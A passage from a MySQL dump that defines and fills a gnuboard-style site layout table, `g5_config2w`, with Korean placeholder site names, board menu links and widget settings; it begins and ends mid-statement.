  `cf_submenu_name_7_5` text NOT NULL,
  `cf_submenu_name_7_6` text NOT NULL,
  `cf_submenu_name_7_7` text NOT NULL,
  `cf_submenu_name_7_8` text NOT NULL,
  `cf_submenu_name_7_9` text NOT NULL,
  `cf_submenu_link_7_0` text NOT NULL,
  `cf_submenu_link_7_1` text NOT NULL,
  `cf_submenu_link_7_2` text NOT NULL,
  `cf_submenu_link_7_3` text NOT NULL,
  `cf_submenu_link_7_4` text NOT NULL,
  `cf_submenu_link_7_5` text NOT NULL,
  `cf_submenu_link_7_6` text NOT NULL,
  `cf_submenu_link_7_7` text NOT NULL,
  `cf_submenu_link_7_8` text NOT NULL,
  `cf_submenu_link_7_9` text NOT NULL,
  `cf_submenu_name_8_0` text NOT NULL,
  `cf_submenu_name_8_1` text NOT NULL,
  `cf_submenu_name_8_2` text NOT NULL,
  `cf_submenu_name_8_3` text NOT NULL,
  `cf_submenu_name_8_4` text NOT NULL,
  `cf_submenu_name_8_5` text NOT NULL,
  `cf_submenu_name_8_6` text NOT NULL,
  `cf_submenu_name_8_7` text NOT NULL,
  `cf_submenu_name_8_8` text NOT NULL,
  `cf_submenu_name_8_9` text NOT NULL,
  `cf_submenu_link_8_0` text NOT NULL,
  `cf_submenu_link_8_1` text NOT NULL,
  `cf_submenu_link_8_2` text NOT NULL,
  `cf_submenu_link_8_3` text NOT NULL,
  `cf_submenu_link_8_4` text NOT NULL,
  `cf_submenu_link_8_5` text NOT NULL,
  `cf_submenu_link_8_6` text NOT NULL,
  `cf_submenu_link_8_7` text NOT NULL,
  `cf_submenu_link_8_8` text NOT NULL,
  `cf_submenu_link_8_9` text NOT NULL,
  `cf_submenu_name_9_0` text NOT NULL,
  `cf_submenu_name_9_1` text NOT NULL,
  `cf_submenu_name_9_2` text NOT NULL,
  `cf_submenu_name_9_3` text NOT NULL,
  `cf_submenu_name_9_4` text NOT NULL,
  `cf_submenu_name_9_5` text NOT NULL,
  `cf_submenu_name_9_6` text NOT NULL,
  `cf_submenu_name_9_7` text NOT NULL,
  `cf_submenu_name_9_8` text NOT NULL,
  `cf_submenu_name_9_9` text NOT NULL,
  `cf_submenu_link_9_0` text NOT NULL,
  `cf_submenu_link_9_1` text NOT NULL,
  `cf_submenu_link_9_2` text NOT NULL,
  `cf_submenu_link_9_3` text NOT NULL,
  `cf_submenu_link_9_4` text NOT NULL,
  `cf_submenu_link_9_5` text NOT NULL,
  `cf_submenu_link_9_6` text NOT NULL,
  `cf_submenu_link_9_7` text NOT NULL,
  `cf_submenu_link_9_8` text NOT NULL,
  `cf_submenu_link_9_9` text NOT NULL,
  `cf_main_nouse_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_20` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_21` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_22` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_23` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_24` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_25` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_26` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_27` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_28` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_29` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_30` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_31` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_32` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_33` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_34` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_35` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_36` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_37` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_38` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_39` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_name_0` text NOT NULL,
  `cf_main_name_1` text NOT NULL,
  `cf_main_name_2` text NOT NULL,
  `cf_main_name_3` text NOT NULL,
  `cf_main_name_4` text NOT NULL,
  `cf_main_name_5` text NOT NULL,
  `cf_main_name_6` text NOT NULL,
  `cf_main_name_7` text NOT NULL,
  `cf_main_name_8` text NOT NULL,
  `cf_main_name_9` text NOT NULL,
  `cf_main_name_10` text NOT NULL,
  `cf_main_name_11` text NOT NULL,
  `cf_main_name_12` text NOT NULL,
  `cf_main_name_13` text NOT NULL,
  `cf_main_name_14` text NOT NULL,
  `cf_main_name_15` text NOT NULL,
  `cf_main_name_16` text NOT NULL,
  `cf_main_name_17` text NOT NULL,
  `cf_main_name_18` text NOT NULL,
  `cf_main_name_19` text NOT NULL,
  `cf_main_name_20` text NOT NULL,
  `cf_main_name_21` text NOT NULL,
  `cf_main_name_22` text NOT NULL,
  `cf_main_name_23` text NOT NULL,
  `cf_main_name_24` text NOT NULL,
  `cf_main_name_25` text NOT NULL,
  `cf_main_name_26` text NOT NULL,
  `cf_main_name_27` text NOT NULL,
  `cf_main_name_28` text NOT NULL,
  `cf_main_name_29` text NOT NULL,
  `cf_main_name_30` text NOT NULL,
  `cf_main_name_31` text NOT NULL,
  `cf_main_name_32` text NOT NULL,
  `cf_main_name_33` text NOT NULL,
  `cf_main_name_34` text NOT NULL,
  `cf_main_name_35` text NOT NULL,
  `cf_main_name_36` text NOT NULL,
  `cf_main_name_37` text NOT NULL,
  `cf_main_name_38` text NOT NULL,
  `cf_main_name_39` text NOT NULL,
  `cf_main_style_0` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_1` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_2` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_3` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_4` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_5` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_6` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_7` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_8` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_9` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_10` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_11` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_12` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_13` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_14` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_15` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_16` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_17` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_18` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_19` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_20` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_21` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_22` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_23` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_24` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_25` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_26` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_27` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_28` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_29` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_30` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_31` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_32` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_33` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_34` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_35` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_36` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_37` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_38` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_39` varchar(30) NOT NULL DEFAULT '',
  `cf_main_long_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_20` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_21` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_22` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_23` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_24` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_25` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_26` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_27` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_28` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_29` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_30` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_31` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_32` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_33` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_34` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_35` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_36` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_37` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_38` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_39` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_name_0` text NOT NULL,
  `cf_main_left_name_1` text NOT NULL,
  `cf_main_left_name_2` text NOT NULL,
  `cf_main_left_name_3` text NOT NULL,
  `cf_main_left_name_4` text NOT NULL,
  `cf_main_left_name_5` text NOT NULL,
  `cf_main_left_name_6` text NOT NULL,
  `cf_main_left_name_7` text NOT NULL,
  `cf_main_left_name_8` text NOT NULL,
  `cf_main_left_name_9` text NOT NULL,
  `cf_main_left_name_10` text NOT NULL,
  `cf_main_left_name_11` text NOT NULL,
  `cf_main_left_name_12` text NOT NULL,
  `cf_main_left_name_13` text NOT NULL,
  `cf_main_left_name_14` text NOT NULL,
  `cf_main_left_name_15` text NOT NULL,
  `cf_main_left_name_16` text NOT NULL,
  `cf_main_left_name_17` text NOT NULL,
  `cf_main_left_name_18` text NOT NULL,
  `cf_main_left_name_19` text NOT NULL,
  `cf_main_left_style_0` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_1` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_2` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_3` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_4` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_5` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_6` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_7` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_8` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_9` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_10` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_11` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_12` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_13` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_14` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_15` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_16` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_17` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_18` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_19` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_admin_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_name_0` text NOT NULL,
  `cf_main_right_name_1` text NOT NULL,
  `cf_main_right_name_2` text NOT NULL,
  `cf_main_right_name_3` text NOT NULL,
  `cf_main_right_name_4` text NOT NULL,
  `cf_main_right_name_5` text NOT NULL,
  `cf_main_right_name_6` text NOT NULL,
  `cf_main_right_name_7` text NOT NULL,
  `cf_main_right_name_8` text NOT NULL,
  `cf_main_right_name_9` text NOT NULL,
  `cf_main_right_name_10` text NOT NULL,
  `cf_main_right_name_11` text NOT NULL,
  `cf_main_right_name_12` text NOT NULL,
  `cf_main_right_name_13` text NOT NULL,
  `cf_main_right_name_14` text NOT NULL,
  `cf_main_right_name_15` text NOT NULL,
  `cf_main_right_name_16` text NOT NULL,
  `cf_main_right_name_17` text NOT NULL,
  `cf_main_right_name_18` text NOT NULL,
  `cf_main_right_name_19` text NOT NULL,
  `cf_main_right_style_0` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_1` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_2` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_3` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_4` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_5` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_6` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_7` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_8` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_9` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_10` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_11` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_12` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_13` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_14` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_15` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_16` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_17` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_18` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_19` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_admin_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_nouse_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_nouse_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_nouse_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_nouse_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_nouse_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_name_0` text NOT NULL,
  `cf_head_name_1` text NOT NULL,
  `cf_head_name_2` text NOT NULL,
  `cf_head_name_3` text NOT NULL,
  `cf_head_name_4` text NOT NULL,
  `cf_head_style_0` varchar(30) NOT NULL DEFAULT '',
  `cf_head_style_1` varchar(30) NOT NULL DEFAULT '',
  `cf_head_style_2` varchar(30) NOT NULL DEFAULT '',
  `cf_head_style_3` varchar(30) NOT NULL DEFAULT '',
  `cf_head_style_4` varchar(30) NOT NULL DEFAULT '',
  `cf_head_long_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_long_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_long_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_long_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_long_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_nouse_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_nouse_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_nouse_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_nouse_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_nouse_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_name_0` text NOT NULL,
  `cf_tail_name_1` text NOT NULL,
  `cf_tail_name_2` text NOT NULL,
  `cf_tail_name_3` text NOT NULL,
  `cf_tail_name_4` text NOT NULL,
  `cf_tail_style_0` varchar(30) NOT NULL DEFAULT '',
  `cf_tail_style_1` varchar(30) NOT NULL DEFAULT '',
  `cf_tail_style_2` varchar(30) NOT NULL DEFAULT '',
  `cf_tail_style_3` varchar(30) NOT NULL DEFAULT '',
  `cf_tail_style_4` varchar(30) NOT NULL DEFAULT '',
  `cf_tail_long_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_long_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_long_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_long_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_long_4` enum('','checked') NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `cf_id` (`cf_id`)
) ENGINE=MyISAM AUTO_INCREMENT=21 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_config2w`
--

LOCK TABLES `g5_config2w` WRITE;
/*!40000 ALTER TABLE `g5_config2w` DISABLE KEYS */;
INSERT INTO `g5_config2w` VALUES (1,'basic','사이트 이름','상호명: 회사 이름 주소: 회사 주소','Copyright (c) 2010 All Rights Reserved.','사이트 키워드들','사이트에 대한 설명','basic',10,10,960,760,0,200,0,0,30,15,15,5,5,'홈','소개','서비스','게시판','블로그','고객 센타','','','','',80,140,140,140,140,140,0,0,0,0,'/','/bbs/board.php?bo_table=intro','/bbs/board.php?bo_table=service','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=blog','/bbs/board.php?bo_table=notice','','','','','','','','','','','','','','','','','','','','','','','','','인사말','연혁','약력','오시는 길','','','','','','','/bbs/board.php?bo_table=intro&wr_id=1','/bbs/board.php?bo_table=intro&wr_id=2','/bbs/board.php?bo_table=intro&wr_id=3','/bbs/board.php?bo_table=intro&wr_id=4','','','','','','','서비스 내용1','서비스 내용2','','','','','','','','','/bbs/board.php?bo_table=service&wr_id=1','/bbs/board.php?bo_table=service&wr_id=2','','','','','','','','','자유 게시판','갤러리1','갤러리2','','','','','','','','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=gallery1','/bbs/board.php?bo_table=gallery2','','','','','','','','멤버 블로그','','','','','','','','','','/bbs/board.php?bo_table=blog','','','','','','','','','','공지 사항','질문 답변','FAQ','콜 센타','','','','','','','/bbs/board.php?bo_table=notice','/bbs/board.php?bo_table=qna','/bbs/board.php?bo_table=faq','/bbs/board.php?bo_table=callcenter','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','checked','checked','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','latest(\"good_webzine_full\", \"gallery_main_ad\", 1, 48)','latest(\"good_basic\", \"notice\", 4, 32)','latest(\"good_basic\", \"free\", 4, 32)','latest(\"good_gallery\", \"gallery1\", 3, 48)','latest(\"good_webzine\", \"gallery2\", 2, 48)','latest(\"good_basic\", \"blog\", 4, 32)','latest(\"good_basic\", \"qna\", 4, 32)','latest(\"good_gallery\", \"gallery1\", 2, 48)','latest(\"good_webzine\", \"gallery2\", 1, 48)','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','checked','','','checked','checked','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','checked','','','','','','','','','','','','','sidemenu(\"good_basic\")','outlogin(\"good_basic\")','outsearch(\"good_basic\")','popular(\"good_basic\")','visit(\"good_basic\")','poll(\"good_basic\")','connect(\"good_basic\")','outnew(\"good_basic\")','','','','','','','','','','','','','sideBox2N','sideBox2N','searchBox2N','sideBox2N','sideBox2N','sideBox2N','sideBox2N','sideBox2N','','','','','','','','','','','','','','','','','','','checked','checked','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','',''),(14,'basic_banner','사이트 이름','상호명: 회사 이름 주소: 회사 주소','Copyright (c) 2010 All Rights Reserved.','사이트 키워드들','사이트에 대한 설명','basic',10,10,960,760,0,200,0,0,30,15,15,5,5,'홈','소개','서비스','게시판','블로그','고객 센타','','','','',80,140,140,140,140,140,0,0,0,0,'/','/bbs/board.php?bo_table=intro','/bbs/board.php?bo_table=service','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=blog','/bbs/board.php?bo_table=notice','','','','','','','','','','','','','','','','','','','','','','','','','인사말','연혁','약력','오시는 길','','','','','','','/bbs/board.php?bo_table=intro&wr_id=1','/bbs/board.php?bo_table=intro&wr_id=2','/bbs/board.php?bo_table=intro&wr_id=3','/bbs/board.php?bo_table=intro&wr_id=4','','','','','','','서비스 내용1','서비스 내용2','','','','','','','','','/bbs/board.php?bo_table=service&wr_id=1','/bbs/board.php?bo_table=service&wr_id=2','','','','','','','','','자유 게시판','갤러리1','갤러리2','','','','','','','','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=gallery1','/bbs/board.php?bo_table=gallery2','','','','','','','','멤버 블로그','','','','','','','','','','/bbs/board.php?bo_table=blog','','','','','','','','','','공지 사항','질문 답변','FAQ','콜 